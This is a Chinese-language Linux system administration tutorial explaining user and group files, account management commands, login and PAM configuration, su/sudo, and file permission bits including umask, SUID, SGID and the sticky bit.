家目录和登录 Shell 在之前已经介绍，不在赘述。

### /etc/shadow文件

/etc/shadow文件只有root用户才能访问，采用以冒号分隔字段的文本格式，但它包含九个字段：

```bash
#cat /etc/shadow
alice:$y$j9T$8BMlyIAvQ4DECdteeQtvP1$LfuXxdDZExBhJDyWExGoHhTXVn0oAg4Yughahjz2hI/:20740:0:99999:7:::
mysql:!:20727::::::
sshd:!*:20727::::::

```

各字段的含义如下：

| 字段                | 含义                                                         |
| ------------------- | ------------------------------------------------------------ |
| 登录名              | 用户名，和 /etc/passwd 第一个字段严格对应                    |
| 密码字段            | 密码哈希，! / *：账号锁定，不能密码登录；一般不允许空        |
| 上次改密码天数      | 从 1970‑01‑01（纪元）算起                                    |
| 最小可改间隔（min） | 改完密码之后，至少要等多少天才允许再次修改，0表示随时可以改  |
| 最大有效期（max）   | 密码多少天之后必须修改，99999表示默认大约永不强制过期        |
| 提前提醒天数        | 密码到期前，提前几天弹窗提醒改密码                           |
| 过期宽限天数        | 密码过期之后，还能继续登录的缓冲天数，过期超过这个数字，账号锁定 |
| 账号禁用日期        | 纪元天数，到这一天账号直接失效（不管密码），留空表示不设置固定失效时间 |
| 保留字段            | 预留，一般为空                                               |

对于使用本地密码认证的账户，密码字段通常保存经过专门密码散列算法处理的数据，而不是明文密码。例如，某些系统可能使用以 $y$ 开头的 yescrypt 密码散列格式。其他的密码格式可以参考[文档](https://hashcat.net/wiki/doku.php?id=example_hashes)。

### /etc/group文件

Linux 通过用户组（Group）将多个用户组织在一起。例如，假设一台服务器上有三个用户：alice、bob 和 charlie。他们各自拥有独立的用户身份，但可能需要共同访问某些文件或目录。如果逐一为每个用户配置访问权限，管理起来就会比较繁琐。用户组提供了一种组织方式：**可以将需要共同访问资源的用户加入同一个组，再根据这个组分配相应权限**。

```
$cat /etc/group
root:x:0:
sudo:x:27:alice
developers:x:1001:alice,bob,charlie
alice:x:1000:
```

/etc/group 也是一种以冒号分隔字段的文本数据库。每行描述一个用户组，共有四个字段。其结构如下：

```text
developers : x : 1001 : alice,bob,charlie
     │        │     │            │
     │        │     │            └── 组成员列表
     │        │     └─────────────── GID
     │        └───────────────────── 组密码字段
     └────────────────────────────── 组名称
```

| 字段       | 示例              | 作用                             |
| ---------- | ----------------- | -------------------------------- |
| 组名称     | developers        | 用于识别用户组                   |
| 组密码字段 | x                 | 通常表示组密码信息由其他文件管理 |
| GID        | 1001              | 用户组的数字标识                 |
| 成员列表   | alice,bob,charlie | 以逗号分隔的组成员用户名         |

一个用户通常具有一个主要组，同时还可以属于多个附加组。

### 查询用户与用户组信息

`whoami` 命令用于显示当前进程有效 UID 对应的用户名。虽然我们通常说它显示“当前用户”，但从进程的角度来看，这个结果实际上与**执行该命令的进程身份**有关。前面介绍过，Shell 可以启动其他程序。这些程序在通常情况下会继承相应的用户身份，因此在普通交互式会话中，`whoami` 显示的往往就是登录账户的用户名。不过，这两者并不始终相同。如果进程通过某种机制改变了有效 UID，那么 `whoami` 显示的身份也可能随之改变。

为了观察更完整的身份信息，可以使用`id`命令，除了显示用户身份，还会列出组身份：

```
$id
uid=1000(alice) gid=1000(alice) groups=1000(alice),27(sudo),1001(developers)
```

其中：

- uid=1000(alice) 表示用户 ID 及其对应名称。
- gid=1000(alice) 表示主要组 ID 及其对应名称。
- groups=... 表示当前进程的组成员关系，包括主要组和附加组。

除了查看当前进程的身份，我们还可以查询系统中的其他账户,如果系统无法找到指定用户，通常会报告相应错误：

```bash
$id root
uid=0(root) gid=0(root) groups=0(root)
```

如果只希望了解某个用户属于哪些组，可以使用`groups`命令，没有参数时显示当前进程对应的组名称，也可以指定用户名：

```bash
$groups root
root : root
```

## 账户信息查询与 NSS

前面通过 /etc/passwd 和 /etc/group 了解了 Linux 如何保存本地用户与用户组信息。但在实际系统中，账户信息不一定全部来自这些文件。例如，企业可能使用 LDAP 或其他集中身份服务管理账户。管理员不必在每台服务器上分别创建相同的用户，服务器也能够查询这些用户的身份信息。因此，Linux 需要一套机制，让程序在查询账户时不必关心数据究竟保存在哪里。

`getent`命令用于通过系统的名称服务查询机制读取数据库记录。NSS（名称服务切换，Name Service Switch）负责决定系统通过哪些来源查询用户名、UID、用户组等信息。基本语法：

```bash
getent 数据库 [键]
```

查询用户 alice，这里的 passwd 表示用户账户数据库，alice 是查询键：

```bash
$ getent passwd alice
alice:x:1000:1000:Alice:/home/alice:/bin/bash
```

查询用户组：

```bash
$ getent group developers
developers:x:1002:alice,bob
```

也可以使用数字 ID 查询：

```bash
$ getent passwd 1000
alice:x:1000:1000:Alice:/home/alice:/bin/bash

$ getent group 1002
developers:x:1002:alice,bob
```

如果不指定查询键，`getent` 命令通常尝试枚举数据库中的所有记录：

```bash
getent passwd
getent group
```

## 创建普通账户

`useradd` 用于创建本地用户账户。假设新员工 alice 需要通过 SSH 登录服务器，并使用 Bash 作为登录 Shell。可以执行：

```bash
# useradd -m -U -s /bin/bash -c "Developer" alice
# getent passwd alice
alice:x:1001:1001:Developer:/home/alice:/bin/bash
```

各选项的作用：

- `-m`：创建家目录。
- `-U`：创建同名用户组，作为用户的主要组。
- `-s`：指定登录 Shell。
- `-c`：设置账户描述。

用户的 UID、GID 通常由系统自动分配。如果希望指定 UID，可以使用 `-u`选项，同名组的 GID 则由系统按规则分配：

```bash
# useradd -m -U -u 1500 -s /bin/bash bob
# id bob
uid=1500(bob) gid=1500(bob) groups=1500(bob)
```

创建账户之后，需要通过 `passwd` 命令设置密码，密码输入时不会显示实际字符：

```bash
# passwd alice
New password:
Retype new password:
passwd: password updated successfully
```

`useradd` 命令的部分默认行为来自以下的文件和目录：

- /etc/default/useradd 主要提供默认家目录基础路径、默认 Shell 等信息。
- /etc/login.defs 则可以配置 UID、GID 分配范围和新建账户相关默认值。
- /etc/skel/ 是新用户家目录的初始文件模板。当使用 `useradd -m` 创建家目录时，工具通常会复制其中的文件，例如 .profile、.bashrc 等。管理员可以通过调整模板，为以后创建的用户提供统一的 Shell 初始化配置。

## 创建系统账户

普通账户通常供人登录使用，而系统账户主要用于服务程序:

```bash
# useradd -r -U -M -d /var/lib/reportd -s /usr/sbin/nologin reportd
# getent passwd reportd
reportd:x:985:985::/var/lib/reportd:/usr/sbin/nologin
```

其中：

- `-r`：按照系统账户规则分配 UID。
- `-U`：创建同名组。
- `-M`：不创建家目录。
- `-d`：设置账户记录中的家目录字段。
- `-s`：指定登录 Shell。

这类系统服务账号，完全不需要配置密码，即使指定了家目录字段，也不会自动创建这个目录，需配合使用`install -d` 可以一次完成目录创建、所有者设置及权限设置，适合准备服务数据目录：

```bash
# install -d -o reportd -g reportd -m 0750 /var/lib/reportd
# ls -ld /var/lib/reportd
drwxr-x--- 2 reportd reportd 4096 Nov 12 09:00 /var/lib/reportd
```

## 修改账户属性

`usermod` 命令用于已有账户修改，基本语法：

```bash
usermod [选项] 用户名
```

给用户追加附加组，把 alice 追加到 docker、sudo 组，保留原有附加组：

```bash
#usermod -aG docker,sudo alice
```

修改登录 shell：

```bash
#usermod -s /bin/bash alice
```

锁定 / 解锁密码登录:

```bash
#usermod -L alice

#usermod -U alice
```

修改家目录并迁移原来家目录的文件：

```bash
#usermod -d /home/newalice -m alice
```

重命名账号，但只改登录名，不会自动改名家目录，需要手动修改：

```bash
#usermod -l newalice alice
```

修改 UID，但原磁盘文件的所有的uid不会自动刷新，需要手动修改：

```bash
#usermod -u 2000 alice
```

设置/清除账号到期时间：

```bash
#usermod -e 2026-12-31 tempuser

#usermod -e -1 tempuser   
```

修改备注（GECOS）:

```bash
#usermod -c "Alice Dev" alice
```

## 组管理

`groupadd`命令用于新建组，例如创建普通组，使用自动分配空闲的 GID：

```bash
#groupadd dev
```

创建低 GID的系统组：

```bash
#groupadd -r dev
```

也可以指定 GID：

```bash
#groupadd -g 1300 dev
```

组已存在时不报错，直接成功退出：

```bash
#groupadd -f dev
```

`groupmod`命令用于修改已有组，例如修改组名，修改 GID：

```bash
#groupmod -n dev-team dev

#groupmod -g 1350 dev
```

`groupdel` 命令用于删除指定的组，但不能删除某个用户的主组，要先把该用户换到别的主组：

```bash
#groupdel dev
```

`gpasswd`命令管理组、组成员、设置组密码、设置组管理员，例如添加用户进组：

```bash
#gpasswd -a alice docker
```

批量设置组员列表，用于一个全新的组，原有组员会移除：

```bash
#gpasswd -M alice,charlie dev
```

将用户从单个附加组移出：

```bash
#gpasswd -d alice dev
```

## 修改密码与账户有效期

用户可以使用passwd 命令修改自己的密码，不需要root权限：

```bash
$ passwd
Changing password for user alice.
Current password:
New password:
Retype new password:
passwd: all authentication tokens updated successfully.
```

修改他人的密码，需要root/sudo权限，不需要知道旧密码，指定用户名输入两次密码即可：

```bash
#passwd alice
```

如果不希望交互式的输入，RHEL / Rocky / CentOS系列使用原生的--std 选项，结合管道来配置：

```bash
#echo "NewPass@123" | passwd --stdin alice
```

Debian / Ubuntu 系列可以使用`chpasswd`命令，并结合管道：

```bash
#echo "alice:NewPass@123" | chpasswd
```

`passwd` 不仅可以设置密码，还可以锁定或解锁本地 Unix 密码，密码锁定一般通过修改 /etc/shadow 中的密码字段实现，使原有密码不能继续用于相应认证。：

```bash
# passwd -l alice

# passwd -u alice
```

账户有效期可由 `chage` 命令管理，例如 账号整体在 2026-12-31 到期，到期直接禁用：

```bash
#chage -E 2026-12-31 contractor
```

设置密码到期的策略，最小7天才能改，90天必须改，到期前14天提醒，过期后给30天空窗：

```bash
#chage -m 7 -M 90 -W 14 -I 30 alice
```

## 删除账户

删除本地用户使用 `userdel`命令：

```bash
userdel alice
```

这通常删除账户数据库中的对应记录，但不会搜索并删除文件系统中全部属于该 UID 的文件。如果希望同时移除家目录及相关邮件目录，可以使用使用 `-r`选项，但其他目录中属于该 UID 的文件仍可能保留：

```bash
userdel -r alice
```

正式删除账户前，应当先检查用户是否仍有运行中的进程、后台任务和需要保存的数据。

对于服务账户，还需要停止相关服务。账户删除后，如果旧 UID 被重新分配给新账户，残留文件可能意外地归属于新用户

# 用户登录与会话

前面介绍的管理命令能够创建用户账户，但账户存在并不意味着用户已经登录系统。

用户登录需要经过一系列处理：确定账户身份、验证认证信息、检查账户状态、建立用户执行环境，最后启动 Shell 或其他程序。不同的登录方式由不同程序完成这些工作。理解它们的区别，是学习 PAM、`su` 和 `sudo` 的基础。

## 本地文本终端登录

Linux 可以通过本地虚拟控制台或串行终端提供文本登录界面。

在常见的 systemd 系统中，虚拟控制台的登录入口由 getty@.service 等服务单元管理，具体执行程序通常是 agetty。可以查看：

```console
$ systemctl status getty@tty1.service
● getty@tty1.service - Getty on tty1
     Loaded: loaded (...)
     Active: active (running) ...
   Main PID: 742 (agetty)
```

agetty 的主要任务是准备终端、显示登录提示并读取用户名，然后调用相应的登录程序。在常见的 util-linux 登录实现中，agetty 不负责完成完整的账户密码认证。它通常将用户名交给 login程序，后者处理认证、账户检查和用户环境初始化。成功登录后，login 程序通常会设置进程的 UID、GID 和附加组，初始化相关环境，并执行用户账户指定的登录 Shell。

## SSH 远程登录

当用户通过网络连接服务器时，通常使用 OpenSSH。例如：

```console
$ ssh alice@192.0.2.10
alice@192.0.2.10's password:
...
alice@server:~$
```

SSH 远程登录不通过本地文本控制台的 agetty 和 login 程序，而是由服务器端的 sshd 处理连接和认证。SSH 支持多种认证方式，例如密码、公钥和键盘交互式认证。

## PAM 认证机制

前面介绍了本地 login 和远程 sshd 两种登录入口。它们处理的连接方式不同，但都可能需要密码认证、账户状态检查和会话初始化。如果每个程序分别实现这些功能，不仅会重复大量代码，也难以集中维护系统认证策略。Linux-PAM 为支持 PAM 的应用程序提供了一套可配置的认证与会话管理接口。

PAM 是 Pluggable Authentication Modules 的缩写，通常译为可插拔认证模块。它由应用程序使用的 PAM 库、配置规则以及具体功能模块组成。支持 PAM 的程序通过 libpam 调用相关接口，由 PAM 按配置选择模块并处理返回结果。例如下面的流程所示：

1. sshd/su/sudo 发起，进入 libpam
2. libpam 读取 pam.d 配置
3. 按配置调用各个 pam 模块
4. 模块结果回到 libpam，合并判定
5. libpam 把最终结果送回最开始的 sshd/su/sudo

### PAM 的四种管理类型

PAM 将功能划分为四种主要类型。

| 类型     | 主要任务               | 典型用途                         |
| -------- | ---------------------- | -------------------------------- |
| auth     | 认证身份               | 验证密码、其他认证凭据           |
| account  | 检查账户状态与使用条件 | 检查账户到期、访问限制           |
| password | 修改认证凭据           | 更新账户密码                     |
| session  | 处理会话建立与关闭     | 设置资源限制、会话环境、记录会话 |

其中，password 不是“登录时验证密码”的意思，而是处理密码等认证凭据的修改。以本地密码登录为例，应用程序可能依次进行认证、账户检查和会话初始化；而用户执行 `passwd` 命令修改密码时，则需要使用密码管理相关接口。

### PAM 配置文件

Linux-PAM 通常通过/etc/pam.d/目录配置，每个服务可以拥有独立的配置文件，文件名代表 PAM 服务，例如：

```text
/etc/pam.d/login
/etc/pam.d/sshd
/etc/pam.d/su
/etc/pam.d/sudo
```

PAM 还支持 /etc/pam.conf 集中配置形式，但现代发行版通常优先采用 /etc/pam.d/。在 /etc/pam.d/ 中，一条典型规则如下：

```text
auth required pam_unix.so
```

可以分为：

```text
auth       required      pam_unix.so
 │             │              │
 │             │              └── 模块及其参数
 │             └───────────────── 控制标志
 └─────────────────────────────── 管理类型
```

同一管理类型可以包含多条规则，由 PAM 按控制标志决定后续执行方式。

### 控制标志

常见控制标志包括：

| 标志       | 基本行为                                             |
| ---------- | ---------------------------------------------------- |
| required   | 必须成功；失败会影响最终结果，但通常继续处理后续模块 |
| requisite  | 必须成功；失败通常立即终止当前模块栈                 |
| sufficient | 在满足相关条件时，成功可提前结束当前模块栈           |
| optional   | 结果通常不单独决定整体成功或失败                     |

### 常见 PAM 模块

pam_unix.so 用于处理传统 Unix 账户认证以及相关的账户和密码管理任务。在本地密码认证场景中，它可以结合受保护的密码信息完成验证。

其他常见模块包括：

| 模块           | 用途                                         |
| -------------- | -------------------------------------------- |
| pam_unix.so    | 传统 Unix 账户认证及相关管理                 |
| pam_rootok.so  | 根据调用者是否具有 root 身份通过相应认证检查 |
| pam_wheel.so   | 按组成员关系限制身份切换                     |
| pam_env.so     | 处理环境变量                                 |
| pam_limits.so  | 应用会话资源限制                             |
| pam_nologin.so | 根据系统维护状态限制某些用户登录             |
| pam_systemd.so | 与 systemd 用户会话管理集成                  |

### PAM 配置复用

如果每个应用程序都分别写入完整的认证模块列表，系统维护会变得困难。因此，发行版通常使用共享 PAM 配置。例如，Debian、Ubuntu 系统常见：

```text
/etc/pam.d/common-auth
/etc/pam.d/common-account
/etc/pam.d/common-password
/etc/pam.d/common-session
```

某个 PAM 服务配置可以使用：

```text
@include common-auth
```

引入共享规则。这是 Linux-PAM 在 `/etc/pam.d/` 中支持的包含语法。另一种写法是：

```text
auth include common-auth
```

此外，PAM 还支持 substack，其模块栈控制行为与普通 include 存在区别。Red Hat 系发行版可能使用 system-auth、password-auth 等共享配置，并通过 authselect 管理。

# 用户身份切换与管理授权

用户正常登录后，进程通常以该用户的身份运行。但管理员可能需要临时使用其他身份。Linux 常用的工具包括 `su` 和 `sudo`。两者都能改变程序运行身份，但在使用方式、密码认证和授权规则方面存在明显区别。

## su：切换用户身份

`su` 用于以其他用户身份启动 Shell 或执行命令。基本语法：

```bash
su [选项] [用户名]
```

例如，当前用户为 alice，需要切换到 bob，在常见的 PAM 配置下，alice 需要输入的是目标用户 bob 的密码：

```console
alice@server:~$ su - bob
Password:
bob@server:~$ whoami
bob
bob@server:~$ id
uid=1002(bob) gid=1002(bob) groups=1002(bob)
bob@server:~$ exit
logout
alice@server:~$
```

如果省略目标用户名：

```bash
su -
```

默认尝试切换到 root，通常需要输入 root 密码。root  账户切换其他的账户，通常不需要该账户的密码。Ubuntu 等系统的某些默认安装配置会锁定 root 密码认证，此时普通用户无法仅通过 `su -` 输入 root 密码完成切换。

下面两种形式不同：

```bash
su bob
su - bob
```

第一种通常保留当前工作目录和调用者的部分环境。第二种使用登录式切换，通常会切换到目标用户家目录，并重新设置 HOME、SHELL、USER、LOGNAME、PATH 等环境信息。

如果只需要执行一条命令，可以使用 `-c`：选项

```console
alice@server:~$ su - bob -c 'id'
Password:
uid=1002(bob) gid=1002(bob) groups=1002(bob)
```

## sudo：按授权执行命令

在传统 Unix 系统中，root 拥有广泛的管理权限。安装软件、维护系统账户、管理服务以及修改受保护的系统配置，通常都需要相应特权。如果多名管理员共用 root 账户，会出现两个问题。首先，每个人都拥有相同的广泛权限。一个只负责维护 Web 服务的管理员，也可能修改账户数据库、调整防火墙，甚至删除其他业务的数据。其次，多个管理员都使用 root 账户执行操作时，仅凭进程的 UID 很难区分具体由谁发起了某次管理行为。

`sudo` 命令正是为解决受控授权和管理操作可追溯性等需求而设计的。它允许管理员**将指定操作的执行权限委派给某个用户或用户组，而不必直接提供 root 密码，也不必授予完整的 root Shell**。

# Linux 文件与目录权限

前面我们已经介绍了 Linux 的用户与用户组，知道每个用户都有对应的 UID，并且可以通过 GID 与其他用户组成用户组。进程在运行时也具有相应的身份凭据。这些身份信息并不只是为了区分不同用户。Linux 还需要利用它们，决定进程能够访问哪些文件，以及允许对这些文件执行什么操作。在最初学习文件操作时，我们已经使用过 `cat`、`cp`、`mv`、`rm` 等命令。但在实际系统中，即使文件确实存在，执行这些命令也不一定成功。例如，普通用户尝试读取某些系统文件时，可能遇到Permission denied,这表示相应操作未能通过访问权限检查。具体原因可能涉及文件权限、目录权限或其他安全机制。要理解这些限制，我们可以先观察一个普通文件的属性。

## 文件的所有者与所属组

Linux 文件系统中的文件和目录通常具有所有者（Owner）与所属组（Group）信息，例如查看etc/passwd文件的详细信息：

```bash
ls -l /etc/passwd
-rw-r--r-- 1 root root 2048 Nov 11 10:30 /etc/passwd
           	   │    │
               │    └── 所属组
               └─────── 所有者
```

第一个 root 表示文件的所有者，第二个 root 表示文件的所属组。这两个名称分别对应一个 UID 和 GID。注意，文件系统记录的所有者和所属组，本质上是数字形式的 UID 与 GID，而不是用户名和组名本身。`ls` 命令只是通过系统的账户查询机制，将数字 ID 转换成更容易阅读的名称。

文件所有权与用户账户数据库之间具有明确的关系：

- 文件系统保存文件所有者的 UID 和所属组的 GID。
- 账户数据库提供 UID、GID 与名称之间的对应关系。
- 进程拥有自己的身份凭据，内核可以利用这些信息进行访问权限检查。

不过，文件属于某个用户，并不意味着只有该用户才能访问。例如，/etc/passwd 的所有者通常是 root，但普通用户往往也能够读取它，因为 Linux 除了保存文件所有权，还会为文件设置具体的访问权限。

## 文件权限的基本结构

观察以下权限字符串：

```text
-rwxr-xr--
```

它可以分为四个部分：

```text
-    rwx    r-x    r--
│     │      │      │
│     │      │      └── 其他用户（Others）
│     │      └───────── 所属组（Group）
│     └──────────────── 所有者（User）
└────────────────────── 文件类型
```

第一个字符表示文件类型，后面的九个字符分成三组，分别表示所有者、所属组类别及其他用户类别的权限。

每组包含三个位置：

| 权限   | 字符 | 对普通文件的含义   |
| ------ | ---- | ------------------ |
| 读取   | r    | 读取文件内容       |
| 写入   | w    | 修改文件内容       |
| 执行   | x    | 将文件作为程序执行 |
| 未授予 | -    | 对应权限未授予     |

例如：-rwxr-xr-- 表示所有者具有读、写、执行权限；所属组具有读、执行权限；其他用户只有读取权限。

这里的三组权限不会相互叠加。对于没有适用扩展 ACL 的普通权限检查，内核根据进程的身份选择相应类别：

1. **所有者（User）**：进程的文件系统 UID 与文件所有者 UID 相同，使用所有者权限。
2. **所属组（Group）**：不满足第一项，但进程的文件系统 GID 或补充组 ID 与文件所属组 GID 匹配，使用所属组权限。
3. **其他用户（Others）**：以上条件均不满足，使用其他用户权限。

例如：

```text
-rw-r----- 1 alice developers 1200 report.txt
```

| 进程身份                | 适用类别 | 权限 |
| :---------------------- | -------- | ---- |
| alice                   | 所有者   | rw-  |
| bob，属于 developers 组 | 所属组   | r--  |
| charlie，不属于该组     | 其他用户 | ---  |

这些是传统权限位的基本规则。扩展 ACL、Capabilities 以及其他安全机制可能进一步影响实际访问结果。

## 普通文件的权限

对于普通文件，`r`、`w`、`x` 控制三种不同操作。

**读取权限（r）**允许进程读取文件内容。

**写入权限（w）**允许进程修改文件内容，包括在相应打开方式下覆盖、追加或截断文件。需要注意，写入权限并不等于删除权限。删除文件涉及修改其父目录中的目录项，因此主要由父目录权限决定。

**执行权限（x）**允许进程请求执行文件。但是，设置了执行权限并不保证文件能够成功运行。文件还需要具有内核支持的可执行格式，或者使用合适的脚本解释器。对于普通二进制程序，读取权限和执行权限可以相互独立；对于 Shell 脚本，解释器通常还需要读取脚本内容。

## 目录的权限

目录也具有 `rwx` 权限，但它们的含义与普通文件不同。Linux 目录用于保存文件名与相应文件系统对象之间的关联。因此，访问目录涉及列出名称、通过名称定位文件，以及修改目录项等操作。

| 权限 | 对目录的含义                                   |
| ---- | ---------------------------------------------- |
| r    | 允许读取目录中的名称列表                       |
| w    | 允许修改目录项，例如创建、删除或重命名文件     |
| x    | 允许搜索、穿越目录，通过已知名称访问其中的对象 |

例如，假设对目录的有读取权限，可以读取其中的文件名列表，但如果没有执行权限，即使能够取得名称，也通常无法通过这些名称进一步访问对应文件的属性或内容（即使对该文件具有读权限）。

目录的执行权限通常称为搜索权限（Search Permission），如果目录只有 x 而没有 r，进程可能无法列出目录内容，但在知道具体文件名的情况下，仍然可以访问其中符合权限要求的文件。

目录的写入权限用于修改目录项，包括创建、删除和重命名文件。但是，对目录项进行这些操作通常还需要目录的 `x` 权限。例如，要在 projects 中创建文件，通常需要对 projects 具有写入和搜索权限。删除文件时也一样。

常见的目录权限配置和解释：

| 权限 | 目录行为                                                     |
| ---- | ------------------------------------------------------------ |
| rwx  | 列出文件名、进入访问、新建 / 删除 / 改名                     |
| r-x  | 列出文件名、进入访问；不能增删改名                           |
| --x  | 不能列出文件名；已知文件名可以访问内部                       |
| r--  | 可列出文件名；无法进入、访问内部对象                         |
| rw-  | 可列出文件名；无遍历权限，w 失效，无法增删条目（无实用价值） |
| ---  | 完全不能访问                                                 |

这里讨论的是目录自身的权限。是否能够读取目录内某个文件，还需要检查目标文件权限以及路径中其他目录的搜索权限。

## 权限的八进制表示法

前面使用的 rwxr-xr-- 属于符号形式的权限表示，Linux 还广泛使用八进制数字表示权限，这不是另一套权限机制，而是对相同权限位的数字编码。每组 rwx 由三个二进制位组成：

| 权限 | 二进制位 | 八进制权值 |
| ---- | -------- | ---------- |
| r    | 100      | 4          |
| w    | 010      | 2          |
| x    | 001      | 1          |

因此，每组权限都可以通过相应权值相加，得到一个 0 至 7 的数字。

| 数字 | 权限 | 含义             |
| ---- | ---- | ---------------- |
| 0    | ---  | 无权限           |
| 1    | --x  | 执行             |
| 2    | -w-  | 写入             |
| 3    | -wx  | 写入、执行       |
| 4    | r--  | 读取             |
| 5    | r-x  | 读取、执行       |
| 6    | rw-  | 读取、写入       |
| 7    | rwx  | 读取、写入、执行 |

将所有者、所属组和其他用户的数字依次排列，就得到三位八进制权限。例如：

```text
rwx  r-x  r--
 7    5    4
```

对应八进制数字表示为754。

## 修改权限

`chmod` 命令用于修改文件或目录的权限模式（Mode）。**只要是文件所有者，就可以随意修改权限，但不能随意修改所有者和所属组**。其基本语法为：

```bash
$chmod MODE FILE...
```

其中，`MODE` 表示希望设置的权限，可以采用八进制数字或符号表达式，例如使用数字表达式：

```bash
$ chmod 760 newfile
```

在符号模式下指定权限的格式为  `[对象][操作符][权限]`看起来比较复杂，对象可以使用以下字符的组合： 

- u：代表用户   
- g：代表组  
-  o：代表其他用户  
- a：代表上述所有 

操作符 表示你是想在现有权限基础上增加权限（+）、移除权限（-），还是设置权限 （=）。 

权限 可以是下列的组合：

- X：仅当对象是目录或者其他权限位已有执行权限时才添加本次要赋予的执行权限。
- s：在执行时设置 SUID 或 SGID。
- t：设置粘滞位（sticky bit）
- u：引用属主当前权限位
- g：引用属组当前权限位
- o：引用其他用户当前权限位

例如为文件所有者添加执行权限：

```
chmod u+x program
```

删除所属组的写入权限：

```
chmod g-w report.txt
```

删除其他用户的读取权限，`o=` 表示清除其他用户类别的基本权限：

```
chmod o-r report.txt
```

符号模式还允许一次指定多组操作，为所有者和所属组增加执行权限，同时删除其他用户的读取权限：

```
chmod u+x,g+x,o-r file
```

**数字模式通常用于明确设置完整权限，符号模式更适合在现有权限基础上进行局部修改。**

`chmod` 命令的 `-R` 选项用于递归处理目录及其内容，但需要谨慎使用，一个项目目录可能同时包含程序文件、配置文件和普通文本文件，不能简单地为所有文件赋予相同权限。

## 修改文件所有权

`chown` 命令用于修改文件所有者也可以同时修改所属组，修改文件的所有者只能 由root账户（或者带 CAP_CHOWN 的进程）修改，普通用户无论如何做不到。但文件所有者可以把把属组改成 自己已经加入的组。基本语法：

```bash
chown [选项] 所有者[:所属组] 文件...
```

例如将所有者改为 alice：

```bash
$chown alice report.txt
```

同时修改所有者和所属组：

```bash
$chown alice:developers report.txt
```

只修改所属组：

```bash
$chown :developers report.txt
```

将文件所有者设置为 alice，并将所属组设置为账户数据库中 alice 的登录组（通常为其主要组）：

```bash
$chown alice: report.txt
```

`-R`选项可以递归地修改子目录和 文件(包含隐藏文件、隐藏子目录)的所属关系:

```bash
chown -R www:www ./data
```

`chgrp` 命令可以方便地修改文件或目录的默认属组,它也支持递归修改:

```bash
$chgrp developers report.txt
```

## umask：新建文件的默认权限

新建文件或目录时，程序会向内核请求一组初始权限，而进程的 umask 会屏蔽其中的部分权限位。查看当前 umask:

```bash
$umask
0022
```

普通文件创建时常见的请求权限为 0666，目录为 0777。在没有默认 ACL 等额外机制影响的典型情况下：最终权限 = 请求权限 & ~umask,更方便的计算公式为：

1. 新建文件预期初始权限 = 0666 − umask 
2. 新建目录预期初始权限 = 0777 − umask

可以使用`umask`命令修改当前 Shell 的 umask：

```bash
$umask 027
```

## 特殊权限位

传统 Unix 权限除了九个基本 rwx 位，还包括三个特殊位：

| 特殊位     | 数值 | 主要用途                                                     |
| ---------- | ---- | ------------------------------------------------------------ |
| SUID       | 4    | 如果文件设置了 SUID 位，当用户执行这个文件时，进程的有效用户 ID（euid）会变成该文件的属主，程序以文件属主的权限运行（**解释型脚本（#! 开头）**内核直接忽略 SUID 位）。文件所有者的权限位必须有x。 |
| SGID       | 2    | 作用于可执行文件：执行程序时，进程有效组 ID（egid）变成这个文件的属组，以文件属组权限运行。<br />作用于目录：在这个目录里面新建文件 / 子目录，自动继承该目录的属组，而不是创建者的默认组。<br />文件和目录的所属组的权限位有x |
| Sticky Bit | 1    | 粘滞位作用在目录上：目录内的文件，仅允许该文件的所有者（以及 root）删除、重命名；就算用户对这个目录拥有 w+x 权限，也不能删掉别人的文件。目录的权限其他位必须有x |

因此，完整模式可以使用四位八进制数字表示：

```text
4755
│└── 普通权限 755
└─── SUID
```

常见示例：

| 模式   | 作用                                   |
| ------ | -------------------------------------- |
| `0755` | 普通权限 `rwxr-xr-x`                   |
| `4755` | SUID + `755`                           |
| `2755` | SGID + `755`                           |
| `2775` | SGID + `775`，常用于共享目录           |
| `1777` | Sticky Bit + `777`，常用于公共临时目录 |

特殊位可以组合，例如最左侧的 `6` 表示同时设置 SUID 和 SGID。如果相应执行位未设置，`ls -l` 会使用大写 S 或 T 显示特殊位表示标记无效，而不是小写 s 或 t。

### SUID

先看一个常见的例子：普通用户修改自己的登录密码。在使用本地 Shadow Password 机制的系统中，密码散列通常保存在 /etc/shadow 中。这个文件受到严格的访问限制，普通用户不能直接修改。但用户显然需要能够修改自己的密码。如果直接允许所有用户写入 /etc/shadow，那么用户就可能修改其他账户的密码信息，破坏账户安全。Linux 需要一种机制，使普通用户能够执行特定的受保护操作，而不必获得对底层敏感文件的直接写入权限。SUID（Set User ID）就是用于改变可执行程序运行身份的一种机制。

在通常情况下，普通用户 alice 执行一个程序时，程序进程的有效 UID 仍然是 alice 的 UID。但如果某个可执行文件设置了 SUID 位，Linux 在执行该程序时，可以将进程的有效 UID 设置为可执行文件所有者的 UID。

可以查看passwd 程序:

```bash
$ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root ... /usr/bin/passwd
```

注意所有者执行权限位置上的 `s`：

```text
rws r-x r-x
  │
  └── SUID 位
```

可以通过 `chmod` 命令管理 SUID 位，使用符号模式添加s位：

```bash
$chmod u+s program
```

删除 SUID：

```bash
$chmod u-s program
```

也可以通过四位八进制模式设置，其中，最左侧的 4 表示 SUID，后面的 755 表示普通 rwx 权限。例如：

```bash
$chmod 4755 program
```

### SGID

SUID 解决的是程序执行过程中用户身份的问题，而 **SGID（Set Group ID）** 可以解决类似的组身份问题。假设系统中有一个受保护的资源，其所属组为 mail，只有具有相应组权限的进程才能访问。普通用户可能需要通过某个专门程序操作这一资源，但并不需要直接加入 mail 组，也不应该对该组的所有资源取得访问权限。如果这个程序属于 mail 组，并且设置了 SGID 位，那么当普通用户执行它时，在内核允许的情况下，程序的有效 GID 可以变为该文件的所属组 GID。

SGID 不仅可以用于可执行文件，还可以用于目录。而在目录上，它的作用与程序执行身份完全不同。在目录上设置 SGID 位，使目录内新建文件和子目录通常继承**父目录的所属组**，保持共享目录树的组所有权一致性，常用于团队协作、共享数据目录及需要统一所属组的工作环境。

### Sticky Bit

Sticky Bit 主要用于保护共享目录中的文件。例如，/tmp 通常允许不同用户创建临时文件。如果一个目录允许所有用户写入和搜索，那么用户可能能够删除该目录中其他用户的文件，因为删除操作主要检查父目录权限。为避免这种情况，可以在目录上设置 Sticky Bit。

在设置 Sticky Bit 的目录中，删除或重命名目录项还受到额外限制。通常只有目标文件所有者、目录所有者或具有相应特权的进程，才能完成这些操作。
